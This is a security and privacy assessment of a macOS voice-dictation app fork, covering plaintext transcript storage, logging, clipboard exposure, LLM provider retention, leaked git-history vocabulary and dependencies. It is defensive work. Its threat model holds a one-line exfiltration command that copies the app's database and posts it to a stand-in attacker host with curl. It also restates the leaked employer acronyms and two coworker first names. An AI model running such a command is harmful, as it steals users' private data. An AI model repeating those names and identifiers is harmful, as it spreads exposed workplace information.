# MacParakeet Security & Privacy Assessment

Generated: 2026-04-14
Subject: `/Users/jnzn08/dev/macparakeet` @ commit `1076781` (feature/streaming-overlay fork of moona3k/macparakeet)

## TL;DR

- **API keys are correctly stored in Keychain** (per-provider, `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`, never logged, excluded from `Codable`). No accidental key leakage found.
- **Dictation history + transcripts are stored unencrypted in plain SQLite** at `~/Library/Application Support/MacParakeet/macparakeet.db`. Default is *save everything*. Any process running as the user can `sqlite3` it. **Biggest exposure surface.** Mitigations require either FileVault dependence (already standard), SQLCipher fork, or per-folder encryption.
- **Save-Audio default is `true` and Save-History default is `true`** — every dictation persists raw transcript + clean transcript + WAV until manually deleted. No retention policy. Also **biggest UX surprise** if the user forgets.
- **BCBSMA acronym JSON was leaked in commits `0faae59` and `a0560eb` and removed in `b17d143`** — the JSON contains `BCBSMA`, `ADH_RW`, `ODH_RW`, `ODH_IICS_USER`, `IICS`, `QEDM`, `DAL DB`, `FSTR`, etc. **No coworker names, no PII, no PHI** in the leaked file — just acronyms that anyone with a public LinkedIn could correlate to the BCBSMA stack. Already in the public fork's git history; treat as public.
- **Additionally: coworker first names (Yeswanth, Susanta) leaked via commit `8986427`** — embedded in the Teams profile prompt. Scrubbed in commit `814c111` (this session) but remains in git history. Treat as exposed. Future sensitive vocabulary must live in the Custom Words DB only.
- **Transcript content is never logged at INFO level** outside of `#if DEBUG` (`streaming_partial_text` line 447 of DictationService). One latent bug class: `error.localizedDescription` from LLM/STT errors is logged with `privacy: .public` — those errors *can* echo prompt content from some providers. Worth gating with `privacy: .private` in Release.
- **Sparkle 2.9.0 → 2.9.1 is available** (low-priority cosmetic update, no CVEs). All other deps current. No active CVEs.

## Threat Model

**Asset:** transcripts of voice dictation, including ad-hoc personal thoughts, work-related Snowflake/BCBSMA discussion, LLM prompts, Jira tickets, and code review commentary. Some of this is HIPAA-adjacent (BCBSMA is a health insurer) — *not* PHI itself, but corporate-confidential and "would be embarrassing if grep-able by another app".

**In scope:**

1. Another non-sandboxed macOS app running as the user (e.g., a malicious VS Code extension, a curl one-liner, a clipboard manager, an MCP server with shell access) reading the SQLite DB or temp WAVs.
2. Forensic recovery of the disk after loss/sale (laptop in a coffee shop scenario).
3. Cloud LLM provider (OpenAI/Anthropic/Groq/Gemini) retaining the transcript text under default ToS.
4. Public git history exposure of work artifacts that should have been private from day one.
5. A subverted local Ollama instance on `macstudio.wyrm-toad.ts.net` (since Tailscale endpoint trust is implicit).

**Explicitly out of scope:**

- Apple, Tailscale, or Cloudflare being compromised at infra level.
- Targeted attacker with user's iCloud credentials + 2FA + recovery key.
- Side-channel attacks against the Apple Neural Engine.
- Anything that requires `sudo` (you've already lost).

**Realistic worst case:** user installs a Homebrew tap with a malicious post-install script that `cp ~/Library/Application\ Support/MacParakeet/macparakeet.db /tmp/x && curl -F file=@/tmp/x https://attacker.com`. App Sandbox does not protect against this since MacParakeet is non-sandboxed (Developer ID notarized). FileVault protects the *off* device. Keychain protects the API keys.

---

## Surface-by-Surface Review

### 1. Log files

**What's exposed.** 175 logger calls across 28 files. Logging uses Apple's `os.Logger` framework with explicit `privacy: .public` interpolation markers on identifiers and error descriptions. The transcript text itself is never logged at INFO/NOTICE/WARNING/ERROR — the only exception is `Sources/MacParakeetCore/Services/DictationService.swift:447`:

```swift
#if DEBUG
logger.debug(
    "streaming_partial_text session=\(sessionID) text=\(partial, privacy: .public)"
)
#endif
```

This is a `#if DEBUG` block, stripped from Release builds. Production INFO logs include character *counts* (`chars=\(partial.count)`, `inputChars=\(text.count)`) but never the text itself.

Files referenced by `scripts/dev/run_app.sh`:

- `${TMPDIR}/macparakeet-dev.log` — captures `nohup open` stdout/stderr; persists until TMPDIR is cleared (~3 days on macOS).
- `${TMPDIR}/macparakeet-dev-build.log` — `xcodebuild` output; harmless build noise.

**Other identifiers logged with `.public`:**

- App profile `displayName` (e.g., "Slack", "iTerm2") — `DictationService.swift:212`
- Audio file `audioURL.path` — `DictationService.swift:256` (UUID filename in `$TMPDIR/macparakeet`)
- `error.localizedDescription` from LLM and STT failures — universally `.public`. **This is the latent risk:** some LLM providers (notably Anthropic) echo a snippet of input back in error messages, especially on context-window violations. If a user dictates "patient John Doe SSN 123-45-6789" and Anthropic returns `400: messages too long for context window: '...patient John Doe SSN...'`, that string lands in unified system logs with `.public` privacy and is readable via `log show --predicate 'subsystem == "com.macparakeet.core"'`.

**Threat.** Low-medium. macOS unified logs persist for ~7 days, are readable by any process running as the user (no special entitlement needed). Forensic recovery of system logs is straightforward.

**Mitigations (sorted by effort):**

1. **Trivial:** Change `.public` to `.private` on `error.localizedDescription` interpolations — at minimum in `LLMService.swift`, `LLMClient.swift`, `LiveChunkTranscriber.swift`. Costs nothing; only Console.app/`log show` from the same user can deobfuscate `.private` strings under macOS 13+ (and even then only with the right entitlement).
2. **Trivial:** Mark `audioURL.path` as `.private` (it's a UUID filename, low value, but still a path leak).
3. **Low:** Add a `MACPARAKEET_LOG_LEVEL` env var that downgrades `.info` to `.debug` in Release. Lets you opt out per-launch.
4. **Medium:** Add a `Settings → Privacy → Verbose Logging` toggle. Off = all info logs become debug. Avoids speculative collection.

---

### 2. Temp audio files

**What's exposed.** Path: `${TMPDIR}/macparakeet/<UUID>.wav`. Files are PCM Float32 16 kHz mono — directly playable. Filename is a v4 UUID so listing the directory leaks count + timestamps but not content metadata.

**Cleanup path.** `DictationService.processCapturedAudio` (line 520) uses a `defer` block that deletes the temp file unless `audioConsumed = true` (set when the file is moved to `~/Library/Application Support/MacParakeet/dictations/`). This is correct for normal flow.

**Crash-recovery scenarios (problematic):**

- App killed by `SIGKILL` (force quit, OOM, kernel panic) between `audioProcessor.stopCapture()` returning a URL and the `defer` running → orphan WAV persists.
- App crashes during `sttTranscriber.transcribe(...)` → `defer` *should* run (Swift defer is exception-safe, but `SIGKILL` skips it).
- Cancel-while-recording in `confirmCancel(_:)` (line 343) → calls `removeItem` directly, but if the user backgrounds the app first and macOS suspends it before cleanup runs, the file lingers until next `stopCapture`.
- Streaming sessions invoke `audioProcessor.stopCapture()` on `cancelRecording` line 326 and store the URL in `pendingCancelledAudioURL`; if the app dies during the 5-second cancel window, the file persists indefinitely.

**No orphan-cleanup on launch.** Searched for any code that wipes `${TMPDIR}/macparakeet` at startup — none exists. `AppPaths.ensureDirectories()` (line 61) only creates directories, never cleans them.

**Threat.** Medium. After a crash, every prior dictation that was in flight survives in TMPDIR. macOS purges TMPDIR on reboot but not on app restart. Realistic exposure window: hours to days.

**Mitigations (sorted by effort):**

1. **Trivial:** In `AppDelegate`-equivalent or `AppPaths.ensureDirectories()`, after creating the directory, enumerate files older than `.now - 1h` and delete them. ~10 lines.
2. **Trivial:** Use `mkstemp`/`URLByCreatingTemporaryDirectoryAtURL` so each dictation gets its own subdirectory that's atomically reaped.
3. **Low:** Set the file as `noFileBackup` and use `URLResourceValues.isExcludedFromBackup` (it's TMPDIR — already excluded). No-op for current setup.
4. **Medium:** Switch temp WAV writing to `Data` in memory + an encrypted in-memory blob, never touching disk for short dictations (<30 s). Larger dictations stream to disk but with `O_NOFOLLOW`. Real protection but real complexity.

---

### 3. SQLite DB

**What's exposed.** Location: `~/Library/Application Support/MacParakeet/macparakeet.db`. GRDB 7.10.0, single-file SQLite. **No SQLCipher.** Schema includes:

| Table | Sensitive columns |
|-------|-------------------|
| `dictations` | `rawTranscript`, `cleanTranscript` (full text), `audioPath`, `pastedToApp` |
| `transcriptions` | `rawTranscript`, `cleanTranscript`, `wordTimestamps`, `summary`, `chatMessages` (legacy), `videoDescription`, `channelName` |
| `chat_conversations` | `messages` (full chat history with the LLM) |
| `summaries` | `content` (full LLM-generated summaries), `extraInstructions` (user prompts) |
| `prompts` | `content` (system prompts the user has saved) |
| `custom_words` | `word`, `replacement` (the BCBSMA acronyms once imported) |
| `text_snippets` | `trigger`, `expansion` (anything the user has set up as a snippet expansion) |

**FTS removed in v0.5** (`v0.5-drop-unused-fts` migration, line 261) — the original FTS5 virtual table is dropped. Search is now `LIKE` queries against the main column.

**Encryption.** None. `DatabaseManager.makeConfiguration()` (line 25) only enables foreign keys. No `PRAGMA key`, no SQLCipher dependency. The file is plaintext SQLite, readable by `sqlite3` from any process running as the user.

**Privacy mode.** When `shouldSaveDictationHistory` is false (`hidden=true` rows), `processCapturedAudio` (line 612–615) saves a row with `rawTranscript = ""` and `cleanTranscript = nil` — only metadata persists. Good. But the default is `true` (save everything) per `AppRuntimePreferences.swift:67`.

**Threat.** Medium-high. This is the single biggest "another app on my Mac reads it" surface. Filesystem-level isolation: macOS App Sandbox protects sandboxed apps' data containers from each other, but MacParakeet is non-sandboxed. Therefore *any* user-process can read it.

FileVault encrypts at rest, so a stolen-while-off Mac is safe; a stolen-while-on Mac is not.

**Mitigations (sorted by effort):**

1. **Trivial:** Document the threat in `docs/security.md` and the README. Set expectations.
2. **Trivial-Low:** Add a default of `false` for `shouldSaveDictationHistory` and require explicit opt-in. The current "save everything by default" is a privacy footgun. **(Recommended.)**
3. **Low:** Add a "Clear all dictations older than N days" timer in `SettingsView`.
4. **Medium:** Switch GRDB to `GRDB-SQLCipher` package. Key derivation from Keychain-stored passphrase. Ongoing cost: ~20% perf hit on writes, but transcripts are tiny.
5. **Medium:** Move the DB into a per-user encrypted disk image (`hdiutil create -encryption AES-256`) mounted on first launch. Heavyweight but uses only Apple primitives.
6. **High:** Application-level encryption: each row's transcript columns are AES-GCM ciphertext, key in Keychain, IV is the row UUID. Search becomes hard (no `LIKE`). Probably not worth it for a personal tool.

---

### 4. Saved audio recordings

**What's exposed.** Path: `~/Library/Application Support/MacParakeet/dictations/<dictation-uuid>.wav`. Same format as the temp WAV. Filename matches `dictations.id` so cross-referencing with the DB is trivial.

**Default.** `shouldSaveAudioRecordings` defaults to `true` (`AppRuntimePreferences.swift:63`). **Every dictation is saved as audio by default.**

**Retention.** None. No auto-delete. The user must visit History and delete each row, which deletes the audio file via `DictationRepository`.

**Threat.** Medium. Same as the DB — co-resident apps read it. Worse than the DB because raw audio includes voice biometrics (a potential identifier even if the *content* is fine).

**Mitigations:**

1. **Trivial:** Default `shouldSaveAudioRecordings` to `false`. Reconsider what users actually need — saved audio is mostly for "I want to play this back later", which is rare for dictation.
2. **Trivial:** Add an "auto-delete dictation audio after N days" setting (default 7).
3. **Low:** Same SQLCipher / encrypted-DMG strategy as above — store WAVs inside the encrypted container.

---

### 5. LLM traffic

**What's exposed.** `LLMClient.swift` makes HTTPS requests to OpenAI, Anthropic, Gemini, Groq, Ollama, LM Studio, and a generic OpenAI-compatible endpoint. Body contains:

- The transcript (full text, post-deterministic-cleanup) as `messages[].content`.
- The system prompt (`AIFormatter.defaultPromptTemplate` or user-customized, possibly overridden by an AppProfile).
- For chat: full prior message history.
- For summaries: full transcript truncated to context budget via `LLMService.truncateMiddle`.

**Headers.** Standard `Authorization: Bearer ...` (OpenAI/Groq/Gemini/Ollama), `x-api-key: ...` + `anthropic-version: 2023-06-01` (Anthropic). **No retention-opt-out headers.** Specifically missing:

- OpenAI: no `OpenAI-Beta`, no `store: false` body field. By default OpenAI retains API request bodies for 30 days under standard ToS.
- Anthropic: no `anthropic-beta: prompt-caching-2024-07-31`, but more importantly **no opt-out mechanism via header — Anthropic's "do not train" is account-level**, set in console.anthropic.com.
- Groq: nothing to do, Groq doesn't train on API data.
- Gemini: free-tier Gemini API logs are used for training by default. Paid AI Studio + Vertex have separate policies.

**API key storage.** Verified clean:

- Stored in Keychain via `KeychainKeyValueStore` (`Sources/MacParakeetCore/Licensing/KeychainKeyValueStore.swift`).
- Per-provider keychain key: `llm_api_key_<provider>` (line 35 of `LLMConfigStore.swift`). Switching providers preserves prior keys.
- Accessibility flag: `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` — never synced to iCloud Keychain, requires device unlock once after boot.
- `apiKey` property on `LLMProviderConfig` is **excluded from `Codable`** (`LLMProvider.swift:54` comment) so it never ends up in UserDefaults.
- No `print(apiKey)`, no `logger.info("...key...")` patterns found across the source tree.

**Connection failures.** `LLMService.swift:103` has the comment `// No errorDetail for LLM errors — API responses may echo user transcript/prompt content` — meaning telemetry classification correctly drops the error body. But `logger.warning(... \(error.localizedDescription, privacy: .public) ...)` does still log it locally to OSLog (see surface 1).

**Threat.** Provider-dependent. For OpenAI/Anthropic/Gemini using a paid account with enterprise-grade DPAs, low. For free-tier Gemini, high (training data). For Groq, low (no training, fast retention). For Ollama/LM Studio over Tailscale, fully local — only risk is if `macstudio.wyrm-toad.ts.net` itself is compromised.

**Mitigations:**

1. **Trivial:** Document per-provider retention assumptions in a Settings tooltip.
2. **Trivial:** Add an `OpenAI-Skip-Retention: true` header for OpenAI requests when the user has opted into "don't train on my data" in Settings. Note this header is non-standard; the supported way is `store: false` in the request body for the chat completions API. ~3 lines in `LLMClient.buildRequest`.
3. **Low:** For Anthropic, add a UI link from Settings → "Configure data privacy at console.anthropic.com" with a one-paragraph explainer. Cannot be solved client-side.
4. **Low:** Add a per-provider "default to local Ollama" hard preference for any transcript over N words, so accidental "send my whole journal to Anthropic" is gated.

---

### 6. Memory residency

**What's exposed.** Streaming partials and final transcripts pass through `String` and `Data` types, which are not zeroed on free. Swift `String` uses copy-on-write tagged pointers; small strings (≤15 bytes) live inline in struct memory and *are* freed predictably, but larger strings allocate on the heap and persist until the OS reclaims the page. Same for `Data` buffers and `AVAudioPCMBuffer`.

**No explicit zeroing.** Searched for `memset_s`, `secureClear`, `withUnsafeMutableBytes.*0x00` — none found. This is normal for non-defense apps; zeroing strings in Swift is hard because of CoW.

**STT model keep-alive.** `Sources/MacParakeetCore/STT/StreamingEouDictationTranscriber.swift` keeps the CoreML model warm via periodic 1-token pings. The model state itself doesn't retain transcript text — Parakeet is a stateless decoder per inference — but the model holds the audio buffer for the current decode pass. The transcriber's `sessionActive` flag and partial buffers persist between sessions; the existing code intentionally avoids cleanup-on-cancel to dodge a race condition (see `DictationService.swift` lines 466–487, repeated comments).

**Threat.** Very low for a personal-tool threat model. Heap inspection requires either a debugger attached (which requires explicit user permission via `task_for_pid` entitlement) or `vmmap`/`leaks` (also user-blocked under SIP).

**Mitigations:**

1. **Document only.** Not worth fighting Swift's memory model for this use case. If concerned, add buffer scrubbing on cancel — but that's belt-and-suspenders.
2. **Optional:** On cancel, explicitly call `transcriber.reset()` to flush internal state, accepting the race condition risk that's currently being avoided. Probably not worth it.

---

### 7. iCloud sync

**What's exposed.** The app's working directory `/Users/jnzn08/dev/macparakeet` is NOT iCloud-backed (per user's memory note about moving away from iCloud-backed workspace). However:

- `AppPaths.appSupportDir` resolves to `~/Library/Application Support/MacParakeet`, which is **not** iCloud-synced (Apple explicitly excludes Application Support from CloudKit and iCloud Drive backup).
- The DB, dictations, models, thumbnails, meeting recordings — all under that path. **Safe from iCloud sync.**
- `Library/Preferences/com.macparakeet.plist` (UserDefaults) — also not iCloud-synced unless explicitly using `NSUbiquitousKeyValueStore` (not used in this codebase, verified by grep).
- Keychain — uses `kSecAttrSynchronizable: kCFBooleanFalse`, so API keys never leave the device via iCloud Keychain.
- **Source code in `~/Library/Mobile Documents/.../dev/macparakeet`** would be iCloud-synced if it lived there. Already-committed git history is not separately at risk via iCloud since iCloud syncs the working tree, but the `.git` directory and any in-progress edits are reflected.

The `scripts/dev/run_app.sh` even has a comment (line 5–8) about iCloud breaking codesign because of fileprovider xattrs — which is why DerivedData is in `$TMPDIR`.

**Threat.** Low for the runtime data. Medium for the source-tree if it were iCloud-backed (anything in working dir is on iCloud → eventually on Apple's servers, encrypted but available to Apple legal process).

**Mitigations:**

1. **Trivial:** Keep working tree at `~/dev/macparakeet` (non-iCloud). Already done.
2. **Document:** Explicit note in `CLAUDE.md` to never put sensitive files (e.g. acronym lists) under `~/Library/Mobile Documents/`. Add a pre-commit hook that fails if any file under the tree contains known sensitive strings.

---

### 8. Tailscale exposure

**What's exposed.** `Info.plist` (generated by `scripts/dev/run_app.sh:140–186` for dev, and by `scripts/dist/build_app_bundle.sh:366–414` for release) declares:

```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsLocalNetworking</key>
    <true/>
    <key>NSExceptionDomains</key>
    <dict>
        <key>ts.net</key>
        <dict>
            <key>NSIncludesSubdomains</key>
            <true/>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <true/>
        </dict>
    </dict>
</dict>
```

**Note: the dist build script (`build_app_bundle.sh`) does NOT include the ATS exceptions** — only the dev build does. Verified by reading the production Info.plist heredoc at lines 366–414 of `build_app_bundle.sh`: no `NSAppTransportSecurity` key. So the **shipped, signed, notarized app cannot make HTTP requests to Tailscale endpoints** — it only allows HTTPS. This is a discrepancy worth noting:

- Dev build (`scripts/dev/run_app.sh`): allows `http://*.ts.net`, allows `http://localhost`, etc.
- Release build (`scripts/dist/build_app_bundle.sh`): no ATS exceptions → only HTTPS unless macOS's default exception for loopback applies.

For the dev build, the exception is scoped to `*.ts.net` (subdomains included) over HTTP. Tailscale already provides WireGuard-encrypted transport beneath, so HTTP-over-Tailscale ≈ HTTPS-over-internet from a confidentiality standpoint. The risk is that the *application-layer* protocol is plaintext — anyone with `tcpdump` access on the receiving Mac sees the bytes.

**LLMSettingsDraft URL allow-list** (line 216) is the second line of defense. It allows:

- HTTPS to anything.
- HTTP to: `localhost`, `127.0.0.1`, `::1`, `*.ts.net`, `100.64.0.0/10` (Tailscale CGNAT), `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `*.local`.

**Bypass concerns:**

- IPv6: `parseIPv4` only handles dotted-quad, so `http://[::1]:11434` would only match if `URL.host` returns `::1`. Empirically `URL("http://[::1]:11434").host == "::1"` so loopback is covered. For `http://[fc00::1]:8080` (ULA, IPv6 private) → `host == "fc00::1"` → `parseIPv4` returns nil → not a `*.ts.net` suffix → not `.local` → returns false. **Restrictive. Good.**
- URL-encoded hosts: `URL("http://%6c%6f%63%61%6c%68%6f%73%74:11434").host` returns `localhost` because Foundation decodes percent-encoding before exposing the host. **No bypass via percent-encoding.**
- Trailing dot: `http://localhost.:11434` would be rejected. Not a security bypass; the opposite — over-restrictive.
- Userinfo abuse: `http://attacker.com@evil.com/...` — `URL.host` returns `evil.com`, so the check sees the actual host. No bypass.
- Suffix games: `http://attacker.com/.ts.net` — `host` is `attacker.com`. No bypass.
- DNS rebinding: not validated against. If someone pointed a `*.ts.net` name at a public IP, this code would happily HTTP to it. Mitigation would require pinning to RFC1918/CGNAT after DNS resolution, which is expensive.

**Threat.** Low. The Tailscale exception is reasonable for a personal LAN tool. The main attack scenario is a compromised Mac Studio (Ollama running on the same tailnet) — but at that point the attacker already owns the LLM endpoint, so HTTP-vs-HTTPS is moot.

**Mitigations:**

1. **Document:** Add a one-line comment in `LLMSettingsDraft.isAllowedBaseURLOverride` noting the DNS-rebinding accepted risk.
2. **Trivial:** Reject hosts with trailing `.`. Cosmetic.
3. **Low:** Add HTTPS-pin for `api.openai.com`, `api.anthropic.com`, `api.groq.com`, `generativelanguage.googleapis.com`, `macparakeet.com` — refuse plaintext to any of these regardless of override. Defense in depth.

---

### 9. Vocabulary in git history

**What's exposed.** Two separate leaks:

**Leak 1: BCBSMA acronym JSON** — commits `0faae59` and `a0560eb` (2026-04-13) added `scripts/vocabulary/bcbsma_acronyms.json`. Commit `b17d143` (2026-04-13, ~12 minutes later) deleted the file and rewrote `import_acronyms.py` to read from a private path. Both commits remain in git history. The fork is on GitHub as `jnzn/macparakeet` — treat as public.

**Content of the leaked JSON:**

- Organization codes: `BCBSMA`, `BCBS MA`, `ET`, `CoE`, `FinOps`, `ARB`, `EOY`, `SME`.
- Internal data marts: `ADH`, `ADH_RW`, `ADH_RO`, `ODH`, `ODH_RW`, `ODH_IICS_USER`, `EDW`, `QEDM`, `DAL DB`.
- Vendor stack: `IICS`, `GCP`, `AWS`, `RDS`, `SNS`, `SFDC`, `dbt`, `EC2`.
- ITSM/governance shorthand: `INC`, `CHG`, `IMAC`, `CAB`, `AIRC`, `QAR`, `FSTR`, `CDR`.

**No coworker names, no email addresses, no phone numbers, no Snowflake account identifiers, no internal URLs, no PHI.** The most sensitive items are `ADH_RW` / `ODH_RW` / `ODH_IICS_USER` (suggests read-write access to those marts) and `BCBSMA` (already public — LinkedIn confirms employer).

**Leak 2: Coworker first names (Yeswanth, Susanta)** — embedded in commit `8986427` (2026-04-14) in the Teams profile's hardcoded prompt override. Scrubbed in commit `814c111` (2026-04-14, this session). Names remain in the git history of the public fork.

**Threat.** Already materialized. Treat both leaks as existing public information.

**Mitigations (sorted by complexity):**

1. **Document, accept risk.** This is the current posture. Reasonable for non-trade-secret content.
2. **Low:** Before any sensitive-file commit, run `git filter-repo --path scripts/vocabulary/bcbsma_acronyms.json --invert-paths` and force-push. Destroys SHAs of all subsequent commits. Usually not worth the reflog invalidation.
3. **Low (recommended):** Add a pre-push hook that scans for `BCBSMA|ADH_RW|ODH_RW|QEDM|FSTR|IICS_USER|Yeswanth|Susanta` in `git rev-list HEAD --not --remotes` and aborts if any match. ~10 lines of bash. Prevents future leaks.
4. **Medium:** Add a CI check on the GitHub fork that runs `gitleaks` or a custom regex scan, fails the build on hits.
5. **Architectural rule:** sensitive vocabulary must live in the Custom Words DB (runtime-only, `~/Library/Application Support/MacParakeet/macparakeet.db`) or in a private repo referenced by path. Never in source code, never in prompts, never in profile defaults.

---

### 10. Clipboard managers

**What's exposed.** `ClipboardService.pasteText` (line 49):

```swift
pasteboard.clearContents()
pasteboard.setString(text, forType: .string)
let ourChangeCount = pasteboard.changeCount
// ... simulate Cmd+V ...
defer {
    DispatchQueue.main.asyncAfter(deadline: .now() + 0.15) {
        guard pasteboard.changeCount == ourChangeCount else { return }
        pasteboard.clearContents()
        if let savedItems, !savedItems.isEmpty {
            pasteboard.writeObjects(savedItems)
        }
    }
}
```

The transcript lands on `NSPasteboard.general`. Any clipboard manager (Paste, Raycast, Maccy, Pastebot, Alfred clipboard history) that observes pasteboard changes will capture it. The 150 ms window before the original clipboard is restored is the user-visible exposure, but clipboard managers polling on changeCount will see the transcript regardless of restore.

**No `NSPasteboard.PasteboardType` exclusion.** macOS supports `NSPasteboardType("org.nspasteboard.ConcealedType")` and `NSPasteboardType("org.nspasteboard.TransientType")` (the `nspasteboard.org` convention). Most modern clipboard managers honor `org.nspasteboard.ConcealedType` to skip recording.

**No "clear after N seconds" for the foreground transcript.** The defer block tries to *restore* the prior clipboard but does not unconditionally clear after a longer delay if no prior clipboard existed.

**Threat.** Medium. Running Raycast / Paste / Maccy / Pastebot will record every dictation in a clipboard history database, which is itself typically unencrypted SQLite.

**Mitigations:**

1. **Trivial:** Add `.transient` and `org.nspasteboard.ConcealedType` types alongside the string write:

```swift
pasteboard.clearContents()
pasteboard.setString(text, forType: .string)
pasteboard.setString("", forType: NSPasteboard.PasteboardType("org.nspasteboard.ConcealedType"))
pasteboard.setString("", forType: NSPasteboard.PasteboardType("org.nspasteboard.TransientType"))
```

This is honored by Maccy and Pastebot. Raycast Clipboard History does not currently honor it (worth verifying).

2. **Low:** Add a Settings → "Hide dictation from clipboard history (Maccy, Paste, Raycast)" toggle that flips on the concealed types.
3. **Low:** Increase the restore delay or add an unconditional `pasteboard.clearContents()` 30 seconds after the paste — but this fights the user when they want to paste again.
4. **Medium:** Use a paste mechanism that bypasses NSPasteboard entirely — e.g., synthesize keystrokes for each character via `CGEventCreateKeyboardEvent`. This is what some password managers do, but is slow (~50 chars/sec) and breaks emoji + non-Latin scripts. Not recommended.

---

## Code-Level Findings

| File:line | Severity | Finding | Mitigation |
|---|---|---|---|
| `Sources/MacParakeetCore/Services/DictationService.swift:447` | Info | `streaming_partial_text` logs full transcript text in DEBUG only. Already gated by `#if DEBUG`. | None needed; verify Release build doesn't accidentally include DEBUG. |
| `Sources/MacParakeetCore/Services/DictationService.swift:224, 300, 655, 706` | Low | `error.localizedDescription` logged with `privacy: .public`. May echo provider response which can include input snippets. | Change `.public` to `.private` on error interpolations across all services. |
| `Sources/MacParakeetCore/Services/LLMService.swift:103` (return value) | Info | Comment confirms errorDetail is intentionally dropped from telemetry to avoid transcript leaks. Good design. | No change. |
| `Sources/MacParakeetCore/Services/DictationService.swift:520–528` | Low | Defer-based temp-WAV cleanup correct for graceful exit, fails on SIGKILL. No orphan reaping at launch. | Add launch-time enumeration of `${TMPDIR}/macparakeet/*.wav` older than 1h. |
| `Sources/MacParakeetCore/Services/AppPaths.swift:61–68` | Info | `ensureDirectories` only creates, never cleans. | Companion `cleanStaleTempFiles()` invoked from app delegate. |
| `Sources/MacParakeetCore/AppRuntimePreferences.swift:63, 67` | Med | `shouldSaveAudioRecordings` and `shouldSaveDictationHistory` both default to `true`. Privacy-by-default would flip these. | Default to `false`; surface as opt-in during onboarding. |
| `Sources/MacParakeetCore/Services/LLMClient.swift:481–494` (Anthropic body) | Low | No `metadata: { user_id: "anonymous" }`, no opt-out flags. By default Anthropic doesn't train on API; reasonable. | Document per-provider retention; add opt-out where supported. |
| `Sources/MacParakeetCore/Services/LLMClient.swift:614–625` (OpenAI body) | Med | Missing `store: false` field. OpenAI retains API request bodies for 30 days by default. | Add `store: false` to `OpenAIRequestBody` when user has opted out via Settings. |
| `Sources/MacParakeetCore/Services/ClipboardService.swift:64–66` | Med | Transcript written to `NSPasteboard.general` without concealment hints. Clipboard managers capture it. | Add `org.nspasteboard.ConcealedType` write alongside the main string. |
| `Sources/MacParakeetCore/Database/DatabaseManager.swift:25–36` | High (privacy) | SQLite is plaintext. `dictations.rawTranscript` and friends readable by any user-process. | Either default to no-history mode, document FileVault dependence, or migrate to GRDB-SQLCipher. |
| `Sources/MacParakeetViewModels/LLMSettingsDraft.swift:216–249` | Low | URL allow-list is solid; IPv6 private ranges (ULA `fc00::/7`) not allowed. DNS rebinding accepted. | Document accepted DNS-rebinding risk; consider IPv6-private parsing if user demand emerges. |
| `Sources/MacParakeetCore/Services/LocalCLIExecutor.swift:514` | Info | Spawns `/bin/zsh -lc <commandTemplate>` with the user's command template inlined. Self-injection only — user controls the template. The user prompt is piped to stdin (no shell expansion). | Already safe. Document the trust model. |
| `Sources/MacParakeetCore/Services/FeedbackService.swift:88` | Info | Feedback POSTs to `macparakeet.com/api/feedback` over HTTPS. User email included if provided (opt-in). | Already correct. |
| `scripts/dev/run_app.sh:193` | Info | Uses `--deep` for codesign. Apple has deprecated `--deep` for nested code signing. | For dist sign script, sign nested binaries individually (already done in `sign_notarize.sh`). For dev script, `--deep` is acceptable. |
| `scripts/dev/run_app.sh:44` | Info | Falls back to ad-hoc signing (`-`) when no real identity is available. TCC will treat each rebuild as a new app, prompting repeatedly. | Acceptable for dev. |
| `Sources/MacParakeetCore/Services/DictationService.swift:212` | Info | `active_profile` log includes profile `displayName` with `.public`. Could leak app names like "Slack". | Acceptable; not transcript content. |

---

## Dependency Audit

Pulled from `Package.resolved`. Latest versions verified via GitHub Releases API.

| Package | Pinned | Latest | Released | Known CVEs (affecting pinned) | Recommendation |
|---|---|---|---|---|---|
| **Sparkle** | 2.9.0 | **2.9.1** | 2026-03-29 | None affecting 2.9.0. Older Sparkle 2.x had CVE-2025-0509 (signing-check bypass, patched in 2.6.4), CVE-2025-10016 (LPE, patched in 2.7.2), CVE-2025-10015 (XPC TCC, patched in 2.7.2). 2.9.0 is comfortably above all patched floors. | **Upgrade to 2.9.1** at next opportunity. 2.9.1 is a race-condition crash fix for `clearDownloadedUpdate` + appcast-generator robustness. No new CVEs. Safe pin. |
| **GRDB.swift** | 7.10.0 | 7.10.0 | 2026-02-15 | None. GRDB does not parse untrusted SQL (queries are parameterized). SQLite itself has historic CVEs but all are fixed in macOS-bundled SQLite. | **Leave.** Up to date. Consider future migration to `GRDB-SQLCipher` variant if encrypting the DB. |
| **FluidAudio** | 0.13.6 | 0.13.6 | 2026-04-04 | None. Pre-1.0 library, no published advisories. Custom CoreML wrapper; main risk is model integrity, not lib code. | **Leave.** Pinned appropriately. Watch GitHub Releases for security notes. Supply-chain caveat: model weights are downloaded at runtime from HuggingFace; integrity relies on TLS alone. |
| **swift-argument-parser** | 1.7.1 | 1.7.1 | 2026-03-20 | None. Apple-maintained, used only by CLI. | **Leave.** Up to date. |

**Transitive risk:** None of the four pulls in additional Swift packages at runtime.

**System-level binaries bundled at distribution time:**

- **FFmpeg** — downloaded at build time from `ffmpeg.martin-riedl.de` with SHA256 verification. Risk: trust in martin-riedl.de's release pipeline.
- **Node.js** — downloaded from `nodejs.org/dist` with SHA256 verification against `SHASUMS256.txt`. Good.
- **yt-dlp** — downloaded at runtime by `BinaryBootstrap`; auto-updated weekly. Worth a separate audit.

---

## Recommended Actions (Prioritized)

### Ship today (low-risk, high-value)

1. **Mark `error.localizedDescription` as `.private` in OSLog interpolations** for `DictationService`, `LLMService`, `LLMClient`, `LiveChunkTranscriber`, `TranscriptionService`. Single-character changes per call site, ~30 edits. Eliminates the only practical transcript-content leak path in production logs.
2. **Add `store: false` to OpenAI request body** when user has opted into a future "Don't retain" Settings toggle. Provider-default mitigation against 30-day retention.
3. **Add concealed-type pasteboard hint** in `ClipboardService.pasteText` so Maccy/Paste/Pastebot stop recording every dictation. ~3 lines.
4. **Add launch-time orphan WAV cleanup** in `AppPaths` or app delegate. Enumerate `${TMPDIR}/macparakeet/*.wav` older than 1 hour, delete. ~15 lines.
5. **Pre-push git hook** that scans for `BCBSMA|ADH_RW|ODH_RW|QEDM|IICS_USER|FSTR|Yeswanth|Susanta` in unpushed commits and aborts. ~10 lines of bash. Prevents future leaks.
6. **Upgrade Sparkle to 2.9.1.** Cosmetic but free.

### Ship this week (medium effort)

